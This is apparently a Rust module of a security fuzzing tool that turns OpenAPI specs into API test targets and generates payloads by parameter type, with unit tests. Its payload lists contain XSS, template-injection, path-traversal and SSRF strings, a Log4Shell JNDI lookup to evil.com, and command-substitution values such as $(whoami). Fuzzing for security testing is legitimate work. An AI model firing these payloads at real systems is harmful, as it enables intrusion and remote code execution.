use super::TargetPayload;
use crate::utils::validation::validate_path;
use serde::{Deserialize, Serialize};
use rustc_hash::FxHashMap;
use std::path::PathBuf;

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct OpenAPISpec {
    pub openapi: String,
    pub info: ApiInfo,
    pub servers: Vec<Server>,
    pub paths: FxHashMap<String, PathItem>,
    pub components: Components,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ApiInfo {
    pub title: String,
    pub version: String,
    pub description: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Server {
    pub url: String,
    pub description: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PathItem {
    pub get: Option<Operation>,
    pub post: Option<Operation>,
    pub put: Option<Operation>,
    pub patch: Option<Operation>,
    pub delete: Option<Operation>,
    pub options: Option<Operation>,
    pub head: Option<Operation>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Operation {
    pub operation_id: Option<String>,
    pub summary: Option<String>,
    pub description: Option<String>,
    pub parameters: Vec<Parameter>,
    pub request_body: Option<RequestBody>,
    pub responses: FxHashMap<String, Response>,
    pub security: Option<Vec<SecurityRequirement>>,
    pub tags: Option<Vec<String>>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Parameter {
    pub name: String,
    pub location: String,
    pub required: bool,
    pub schema: Schema,
    pub description: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct RequestBody {
    pub required: bool,
    pub content: FxHashMap<String, MediaType>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct MediaType {
    pub schema: Schema,
    pub example: Option<serde_json::Value>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Schema {
    pub r#type: Option<String>,
    pub format: Option<String>,
    pub properties: Option<FxHashMap<String, Schema>>,
    pub items: Option<Box<Schema>>,
    pub enum_values: Option<Vec<serde_json::Value>>,
    pub minimum: Option<f64>,
    pub maximum: Option<f64>,
    pub min_length: Option<usize>,
    pub max_length: Option<usize>,
    pub pattern: Option<String>,
    pub required: Option<Vec<String>>,
    pub all_of: Option<Vec<Schema>>,
    pub one_of: Option<Vec<Schema>>,
    pub any_of: Option<Vec<Schema>>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct Response {
    pub description: String,
    pub content: Option<FxHashMap<String, MediaType>>,
    pub headers: Option<FxHashMap<String, serde_json::Value>>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Components {
    pub schemas: Option<FxHashMap<String, Schema>>,
    pub security_schemes: Option<FxHashMap<String, SecurityScheme>>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SecurityScheme {
    pub r#type: String,
    pub scheme: Option<String>,
    pub bearer_format: Option<String>,
    pub flows: Option<serde_json::Value>,
    pub open_id_connect_url: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SecurityRequirement {
    #[serde(flatten)]
    pub schemes: FxHashMap<String, Vec<String>>,
}

#[derive(Debug, Clone)]
pub struct ApiFuzzTarget {
    pub url: String,
    pub method: String,
    pub path: String,
    pub parameters: Vec<Parameter>,
    pub fuzz_points: Vec<FuzzPoint>,
}

#[derive(Debug, Clone)]
pub struct FuzzPoint {
    pub name: String,
    pub location: String,
    pub schema: Schema,
    pub fuzz_type: FuzzType,
}

#[derive(Debug, Clone)]
pub enum FuzzType {
    Integer,
    String,
    Email,
    Url,
    Uuid,
    Date,
    Boolean,
    Array,
    Object,
    Custom(String),
}

pub struct OpenAPIFuzzer {
    spec: OpenAPISpec,
    base_url: String,
}

impl OpenAPIFuzzer {
    pub fn new(spec: OpenAPISpec) -> Self {
        let base_url = spec
            .servers
            .first()
            .map(|s| s.url.clone())
            .unwrap_or_default();

        Self { spec, base_url }
    }

    pub fn parse_from_file(path: &str) -> Result<Self, Box<dyn std::error::Error + Send + Sync>> {
        let base = PathBuf::from(".");
        let validated = validate_path(&base, &PathBuf::from(path))?;
        let content = std::fs::read_to_string(&validated)?;
        let spec: OpenAPISpec = serde_json::from_str(&content)?;
        Ok(Self::new(spec))
    }

    pub fn parse_from_url(url: &str) -> Result<Self, Box<dyn std::error::Error + Send + Sync>> {
        let content = reqwest::blocking::get(url)?.text()?;
        let spec: OpenAPISpec = serde_json::from_str(&content)?;
        Ok(Self::new(spec))
    }

    pub fn generate_targets(&self) -> Vec<ApiFuzzTarget> {
        let mut targets = Vec::new();

        for (path, path_item) in &self.spec.paths {
            let methods = ["get", "post", "put", "patch", "delete", "options", "head"];

            for method in methods {
                let operation = match method {
                    "get" => &path_item.get,
                    "post" => &path_item.post,
                    "put" => &path_item.put,
                    "patch" => &path_item.patch,
                    "delete" => &path_item.delete,
                    "options" => &path_item.options,
                    "head" => &path_item.head,
                    _ => &None,
                };

                if let Some(op) = operation {
                    let fuzz_points = self.extract_fuzz_points(&op.parameters);

                    targets.push(ApiFuzzTarget {
                        url: format!("{}{}", self.base_url, path),
                        method: method.to_uppercase(),
                        path: path.clone(),
                        parameters: op.parameters.clone(),
                        fuzz_points,
                    });
                }
            }
        }

        targets
    }

    fn extract_fuzz_points(&self, parameters: &[Parameter]) -> Vec<FuzzPoint> {
        let mut points = Vec::new();

        for param in parameters {
            let fuzz_type = match param.schema.r#type.as_deref() {
                Some("integer") | Some("number") => FuzzType::Integer,
                Some("string") => {
                    if let Some(format) = &param.schema.format {
                        match format.as_str() {
                            "email" => FuzzType::Email,
                            "uri" | "url" => FuzzType::Url,
                            "uuid" => FuzzType::Uuid,
                            "date" | "date-time" => FuzzType::Date,
                            _ => FuzzType::String,
                        }
                    } else if let Some(pattern) = &param.schema.pattern {
                        FuzzType::Custom(pattern.clone())
                    } else {
                        FuzzType::String
                    }
                }
                Some("boolean") => FuzzType::Boolean,
                Some("array") => FuzzType::Array,
                Some("object") => FuzzType::Object,
                _ => FuzzType::String,
            };

            points.push(FuzzPoint {
                name: param.name.clone(),
                location: param.location.clone(),
                schema: param.schema.clone(),
                fuzz_type,
            });
        }

        points
    }

    pub fn generate_fuzz_payloads(&self, fuzz_type: &FuzzType) -> Vec<String> {
        match fuzz_type {
            FuzzType::Integer => vec![
                "0".to_string(),
                "-1".to_string(),
                "1".to_string(),
                "999999999".to_string(),
                "9223372036854775807".to_string(),
                "-9223372036854775808".to_string(),
                "0xFF".to_string(),
                "1e10".to_string(),
                "null".to_string(),
                "true".to_string(),
                "false".to_string(),
                "NaN".to_string(),
                "Infinity".to_string(),
                "-Infinity".to_string(),
            ],
            FuzzType::String => vec![
                "".to_string(),
                "a".to_string(),
                "a".repeat(100),
                "a".repeat(10000),
                "\u{0000}".to_string(),
                "\n".to_string(),
                "\r".to_string(),
                "\t".to_string(),
                "'\"".to_string(),
                "<script>alert(1)</script>".to_string(),
                "{{7*7}}".to_string(),
                "${jndi:ldap://evil.com/a}".to_string(),
                "../../../etc/passwd".to_string(),
                "test\n<script>alert(1)</script>".to_string(),
            ],
            FuzzType::Email => vec![
                "".to_string(),
                "test".to_string(),
                "test@".to_string(),
                "@example.com".to_string(),
                "test@example.com".to_string(),
                "test@localhost".to_string(),
                "test@example.com\nContent-Type: text/html\n<script>alert(1)</script>".to_string(),
                "test@example.com<svg onload=alert(1)>".to_string(),
                "admin@$(whoami).com".to_string(),
                "test@`.whoami`.com".to_string(),
            ],
            FuzzType::Url => vec![
                "".to_string(),
                "http".to_string(),
                "http://".to_string(),
                "https://localhost".to_string(),
                "https://127.0.0.1".to_string(),
                "file:///etc/passwd".to_string(),
                "dict://localhost:11211/stats".to_string(),
                "gopher://evil.com/_test".to_string(),
                "http://evil.com/".to_string(),
                "https://metadata.google.internal".to_string(),
            ],
            FuzzType::Uuid => vec![
                "00000000-0000-0000-0000-000000000000".to_string(),
                "invalid-uuid".to_string(),
                "null".to_string(),
                "12345678-1234-1234-1234-123456789abc".to_string(),
            ],
            FuzzType::Date => vec![
                "".to_string(),
                "invalid".to_string(),
                "1970-01-01".to_string(),
                "1969-12-31T23:59:59Z".to_string(),
                "3000-01-01".to_string(),
                "2023-02-30".to_string(),
                "2023-13-01".to_string(),
                "2023-01-01T00:00:00Z".to_string(),
                "2023-01-01T00:00:00+00:00".to_string(),
            ],
            FuzzType::Boolean => vec![
                "true".to_string(),
                "false".to_string(),
                "1".to_string(),
                "0".to_string(),
                "yes".to_string(),
                "no".to_string(),
                "True".to_string(),
                "FALSE".to_string(),
                "null".to_string(),
                "".to_string(),
            ],
            FuzzType::Array => vec![
                "[]".to_string(),
                "[1]".to_string(),
                "[1,2,3]".to_string(),
                "[\"\"]".to_string(),
                "[null]".to_string(),
                "[\"a\",\"b\",\"c\"]".to_string(),
                "[1,\"a\"]".to_string(),
            ],
            FuzzType::Object => vec![
                "{}".to_string(),
                "{\"a\":\"b\"}".to_string(),
                "{\"a\":1}".to_string(),
                "{\"a\":null}".to_string(),
                "{\"a\":[1,2,3]}".to_string(),
                "{\"a\":{\"b\":\"c\"}}".to_string(),
                "{\"a\":\"b\",\"c\":\"d\"}".to_string(),
            ],
            FuzzType::Custom(pattern) => {
                vec!["a".to_string(), "1".to_string(), pattern.to_string()]
            }
        }
    }
}

pub fn get_payloads() -> Vec<TargetPayload> {
    vec![
        TargetPayload {
            payload: "1".to_string(),
            description: "IDOR test - sequential ID".to_string(),
            category: "idor".to_string(),
        },
        TargetPayload {
            payload: "null".to_string(),
            description: "IDOR test - null value".to_string(),
            category: "idor".to_string(),
        },
    ]
}

#[cfg(test)]
mod tests {
    use super::*;
    use rustc_hash::FxHashMap;
    use crate::fuzzer::TargetType;

    fn make_test_spec() -> OpenAPISpec {
        let mut paths = FxHashMap::default();
        let mut query_params = Vec::new();
        query_params.push(Parameter {
            name: "id".to_string(),
            location: "query".to_string(),
            required: true,
            schema: Schema {
                r#type: Some("integer".to_string()),
                format: None,
                properties: None,
                items: None,
                enum_values: None,
                minimum: None,
                maximum: None,
                min_length: None,
                max_length: None,
                pattern: None,
                required: None,
                all_of: None,
                one_of: None,
                any_of: None,
            },
            description: Some("Resource ID".to_string()),
        });
        query_params.push(Parameter {
            name: "email".to_string(),
            location: "query".to_string(),
            required: false,
            schema: Schema {
                r#type: Some("string".to_string()),
                format: Some("email".to_string()),
                properties: None,
                items: None,
                enum_values: None,
                minimum: None,
                maximum: None,
                min_length: None,
                max_length: None,
                pattern: None,
                required: None,
                all_of: None,
                one_of: None,
                any_of: None,
            },
            description: None,
        });

        let get_op = Operation {
            operation_id: Some("getResource".to_string()),
            summary: Some("Get resource".to_string()),
            description: None,
            parameters: query_params,
            request_body: None,
            responses: FxHashMap::default(),
            security: None,
            tags: Some(vec!["resources".to_string()]),
        };

        let post_op = Operation {
            operation_id: Some("createResource".to_string()),
            summary: Some("Create resource".to_string()),
            description: None,
            parameters: vec![],
            request_body: Some(RequestBody {
                required: true,
                content: FxHashMap::default(),
            }),
            responses: FxHashMap::default(),
            security: None,
            tags: None,
        };

        paths.insert(
            "/api/resource".to_string(),
            PathItem {
                get: Some(get_op),
                post: None,
                put: None,
                patch: None,
                delete: None,
                options: None,
                head: None,
            },
        );
        paths.insert(
            "/api/resource/create".to_string(),
            PathItem {
                get: None,
                post: Some(post_op),
                put: None,
                patch: None,
                delete: None,
                options: None,
                head: None,
            },
        );

        OpenAPISpec {
            openapi: "3.0.0".to_string(),
            info: ApiInfo {
                title: "Test API".to_string(),
                version: "1.0.0".to_string(),
                description: Some("Test API description".to_string()),
            },
            servers: vec![Server {
                url: "http://localhost:8080".to_string(),
                description: None,
            }],
            paths,
            components: Components {
                schemas: None,
                security_schemes: None,
            },
        }
    }

    #[test]
    fn test_api_get_payloads_count() {
        let payloads = get_payloads();
        assert_eq!(payloads.len(), 2);
    }

    #[test]
    fn test_api_get_payloads_categories() {
        let payloads = get_payloads();
        for p in &payloads {
            assert_eq!(p.category, "idor");
        }
    }

    #[test]
    fn test_openapi_fuzzer_construction() {
        let spec = make_test_spec();
        let fuzzer = OpenAPIFuzzer::new(spec);
        assert_eq!(fuzzer.base_url, "http://localhost:8080");
    }

    #[test]
    fn test_openapi_fuzzer_no_server_default() {
        let mut spec = make_test_spec();
        spec.servers = vec![];
        let fuzzer = OpenAPIFuzzer::new(spec);
        assert_eq!(fuzzer.base_url, "");
    }

    #[test]
    fn test_generate_targets_finds_operations() {
        let spec = make_test_spec();
        let fuzzer = OpenAPIFuzzer::new(spec);
        let targets = fuzzer.generate_targets();
        // Should find GET on /api/resource and POST on /api/resource/create
        assert!(targets.len() >= 2, "should find at least 2 targets, got {}", targets.len());

        let methods: Vec<&str> = targets.iter().map(|t| t.method.as_str()).collect();
        assert!(methods.contains(&"GET"));
        assert!(methods.contains(&"POST"));
    }

    #[test]
    fn test_generate_targets_includes_fuzz_points() {
        let spec = make_test_spec();
        let fuzzer = OpenAPIFuzzer::new(spec);
        let targets = fuzzer.generate_targets();
        let get_target = targets.iter().find(|t| t.method == "GET").expect("GET target should exist");
        assert_eq!(get_target.fuzz_points.len(), 2);
        assert_eq!(get_target.fuzz_points[0].name, "id");
        assert_eq!(get_target.fuzz_points[1].name, "email");
    }

    #[test]
    fn test_extract_fuzz_point_types() {
        let spec = make_test_spec();
        let fuzzer = OpenAPIFuzzer::new(spec);
        let targets = fuzzer.generate_targets();
        let get_target = targets.iter().find(|t| t.method == "GET").expect("GET target should exist");

        // id is integer
        assert!(matches!(get_target.fuzz_points[0].fuzz_type, FuzzType::Integer));
        // email is Email
        assert!(matches!(get_target.fuzz_points[1].fuzz_type, FuzzType::Email));
    }

    #[test]
    fn test_generate_fuzz_payloads_all_types() {
        let spec = make_test_spec();
        let fuzzer = OpenAPIFuzzer::new(spec);

        let types = [
            FuzzType::Integer,
            FuzzType::String,
            FuzzType::Email,
            FuzzType::Url,
            FuzzType::Uuid,
            FuzzType::Date,
            FuzzType::Boolean,
            FuzzType::Array,
            FuzzType::Object,
            FuzzType::Custom("test".to_string()),
        ];

        for fuzz_type in &types {
            let payloads = fuzzer.generate_fuzz_payloads(fuzz_type);
            assert!(!payloads.is_empty(), "payloads for {:?} should not be empty", fuzz_type);
        }
    }

    #[test]
    fn test_generate_fuzz_payloads_integer_edge_cases() {
        let spec = make_test_spec();
        let fuzzer = OpenAPIFuzzer::new(spec);
        let payloads = fuzzer.generate_fuzz_payloads(&FuzzType::Integer);
        assert!(payloads.contains(&"0".to_string()));
        assert!(payloads.contains(&"-1".to_string()));
        assert!(payloads.contains(&"null".to_string()));
        assert!(payloads.contains(&"NaN".to_string()));
    }

    #[test]
    fn test_generate_fuzz_payloads_string_includes_xss() {
        let spec = make_test_spec();
        let fuzzer = OpenAPIFuzzer::new(spec);
        let payloads = fuzzer.generate_fuzz_payloads(&FuzzType::String);
        assert!(payloads.iter().any(|p| p.contains("<script>")));
    }

    #[test]
    fn test_generate_fuzz_payloads_url_includes_ssrf() {
        let spec = make_test_spec();
        let fuzzer = OpenAPIFuzzer::new(spec);
        let payloads = fuzzer.generate_fuzz_payloads(&FuzzType::Url);
        assert!(payloads.iter().any(|p| p.contains("file:///")));
        assert!(payloads.iter().any(|p| p.contains("gopher://")));
    }

    #[test]
    fn test_openapi_types_display() {
        assert_eq!(TargetType::Api.to_string(), "api");
    }

    #[test]
    fn test_openapi_types_serialize_roundtrip() {
        let spec = make_test_spec();
        let json = serde_json::to_string(&spec).unwrap();
        let parsed: OpenAPISpec = serde_json::from_str(&json).unwrap();
        assert_eq!(parsed.openapi, "3.0.0");
        assert_eq!(parsed.info.title, "Test API");
    }

    #[test]
    fn test_openapi_spec_server_url_used() {
        let spec = make_test_spec();
        let fuzzer = OpenAPIFuzzer::new(spec);
        let targets = fuzzer.generate_targets();
        for t in &targets {
            assert!(t.url.starts_with("http://localhost:8080"));
        }
    }
}
